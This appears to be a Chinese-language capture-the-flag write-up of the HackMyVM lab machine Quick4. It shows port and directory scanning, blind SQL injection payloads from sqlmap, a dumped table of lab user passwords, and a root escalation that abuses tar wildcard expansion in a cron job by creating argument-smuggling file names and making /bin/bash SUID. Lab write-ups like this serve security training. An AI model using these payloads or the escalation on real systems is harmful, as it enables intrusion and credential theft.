---
sidebar_position: 11
tags: [Easy, Linux, SQLI, 文件上传, 定时任务]
title: Quick4
description: Quick4
---
# Quick4
## 端口扫描
```bash
┌──(CTF)─(root㉿kali)-[~/CTF/HackerMyVM]
└─# nmap -sTCV -p- --min-rate 1000 192.168.0.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 09:50 EDT
Nmap scan report for espo.hmv (192.168.0.102)
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Quick Automative - Home
MAC Address: 08:00:27:AA:84:13 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
```
## HTTP - 80
```bash
┌──(CTF)─(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.102/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.102/images/]
/index.html           (Status: 200) [Size: 51414]
/.php                 (Status: 403) [Size: 278]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.102/img/]
/modules              (Status: 301) [Size: 316] [--> http://192.168.0.102/modules/]
/careers              (Status: 301) [Size: 316] [--> http://192.168.0.102/careers/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.102/css/]
/lib                  (Status: 301) [Size: 312] [--> http://192.168.0.102/lib/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.102/js/]
/customer             (Status: 301) [Size: 317] [--> http://192.168.0.102/customer/]
/404.html             (Status: 200) [Size: 5014]
/robots.txt           (Status: 200) [Size: 32]
/fonts                (Status: 301) [Size: 314] [--> http://192.168.0.102/fonts/]
/employee             (Status: 301) [Size: 317] [--> http://192.168.0.102/employee/]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
```
目录扫描之后基本可以确定存在两个子网站, 一个是用户网站一个是员工网站, 经过尝试可以发现一个 SQL 注入漏洞
```bash
┌──(CTF)─(root㉿kali)-[~/CTF/HackerMyVM]
└─# sqlmap -r sql.txt --risk 3 --level 3
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: email=' OR NOT 6230=6230-- LVua&password=admin&submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=' AND (SELECT 3094 FROM (SELECT(SLEEP(5)))jLoL)-- JxvH&password=admin&submit=Login
---
```
基于得到得 SQL 注入漏洞我获取到了对于的 User 数据表
```bash
+----+-----------------------------------+---------------------+----------+--------------------+----------------------+
| id | email                             | name                | role     | password           | profile_picture      |
+----+-----------------------------------+---------------------+----------+--------------------+----------------------+
| 1  | info@quick.hmv                    | Quick               | admin    | Qe62W064sgRTdxAEpr | uploads/1_admin.png  |
| 2  | nick.greenhorn@quick.hmv          | Nick Greenhorn      | employee | C3ho049g4kwxTxuSUA | uploads/2_admin.png  |
| 3  | andrew.speed@quick.hmv            | Andrew Speed        | employee | o30VfVgts73ibSboUP | uploads/3_andrew.jpg |
| 4  | jack.black@email.hmv              | Jack Black          | customer | 1Wd35lRnAKMGMEwcsX | <blank>              |
| 5  | mike.cooper@quick.hmv             | Mike Cooper         | employee | Rh978db3URen64yaPP | uploads/5_mike.jpg   |
| 6  | j.doe@email.hmv                   | John Doe            | customer | 0i3a8KyWS2IcbmqF02 | <blank>              |
| 7  | jane_smith@email.hmv              | Jane Smith          | customer | pL2a92Po2ykXytzX7y | <blank>              |
| 8  | frank@email.hmv                   | Frank Stein         | customer | 155HseB7sQzIpE2dIG | <blank>              |
| 9  | fred.flinstone@email.hmv          | Fred Flinstone      | customer | qM51130xeGHHxKZWqk | <blank>              |
| 10 | s.hutson@email.hmv                | Sandra Hutson       | customer | sF217VruHNj6wbjofU | <blank>              |
| 11 | b.clintwood@email.hmv             | Bill Clintwood      | customer | 2yLw53N0m08OhFyBXx | <blank>              |
| 12 | j.bond@email.hmv                  | James Bond          | customer | 7wS93MQPiVQUkqfQ5T | <blank>              |
| 13 | d.trumpet@email.hmv               | Donald Trumpet      | customer | f64KBw7cGvu1BkVwcb | <blank>              |
| 14 | m.monroe@email.hmv                | Michelle Monroe     | customer | f64KBw7cGvu1BkVwcb | <blank>              |
| 15 | jeff.anderson@quick.hmv           | Jeff Anderson       | employee | 5dX3g8hnKo7AFNHXTV | uploads/15_jeff.jpg  |
| 16 | lee.ka-shingn@quick.hmv@quick.hmv | Lee Ka-shing        | employee | am636X6Rh1u6S8WNr4 | uploads/16_lee.jpg   |
| 17 | laura.johnson@email.hmv           | Laura Johnson       | customer | 95T3OmjOV3gublmR7Z | <blank>              |
| 18 | coos.busters@quick.hmv            | Coos Busters        | employee | f1CD3u3XVo0uXumGah | uploads/18_coos.jpg  |
| 19 | n.down@email.hmv                  | Neil Down           | customer | Lj9Wr562vqNuLlkTr0 | <blank>              |
| 20 | t.green@email.hmv                 | Teresa Green        | customer | 7zQ19L0HhFsivH3zFi | <blank>              |
| 21 | k.ball@email.hmv                  | Krystal Ball        | customer | k1TI68MmYu8uQHhfS1 | <blank>              |
| 22 | juan.mecanico@quick.hmv           | Juan Mecánico       | employee | 5a34pXYDAOUMZCoPrg | uploads/22_juan.jpg  |
| 23 | john.smith@quick.hmv              | John Smith          | employee | 5Wqio90BLd7i4oBMXJ | uploads/23_john.jpg  |
| 24 | misty.cupp@email.hmv              | Misty Cupp          | customer | c1P35bcdw0mF3ExJXG | <blank>              |
| 25 | lara.johnson@quick.hmv            | Lara Johnson        | employee | 5Y7zypv8tl9N7TeCFp | uploads/25_lara.jpg  |
| 26 | j.daniels@email.hmv               | James Daniels       | customer | yF891teFhjhj0Rg7ds | <blank>              |
| 27 | dick_swett@email.hmv              | Dick Swett          | customer | y6KA4378EbK0ePv5XN | <blank>              |
| 28 | a.lucky@email.hmv                 | Anna Lucky          | customer | c1P35bcdw0mF3ExJXG | <blank>              |
| 29 |  andrew.speed@quick.hmv           | admin1              | customer | admin              | <blank>              |
| 30 | admin3@qq.com                     | admin3' or 1=1 -- - | customer | admin3             | <blank>              |
+----+-----------------------------------+---------------------+----------+--------------------+----------------------+
```
随后可以发现一个文件上传的位置
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416225705.png)
但是存在一些限制, 需要进行 ByPass 手段, 检测的方式是依靠文件幻数进行操作
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416232200.png)
## 后渗透
### www-data --> root
```bash
(remote) www-data@quick4:/usr/local/bin$ cat backup.sh 
#!/bin/bash
cd /var/www/html/
tar czf /var/backups/backup-website.tar.gz *
(remote) www-data@quick4:/usr/local/bin$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
*/1 *   * * *   root    /usr/local/bin/backup.sh
```
查看定时任务可以发现一个 root 定时任务, 执行一个脚本这个脚本存在 tar 的通配符利用问题
```bash
(remote) www-data@quick4:/var/www/html$ echo 'chmod u+s /bin/bash' > root.sh
(remote) www-data@quick4:/var/www/html$ echo "" > "--checkpoint-action=exec=sh root.sh" 
(remote) www-data@quick4:/var/www/html$ echo "" > --checkpoint=1
(remote) www-data@quick4:/var/www/html$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
(remote) www-data@quick4:/var/www/html$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```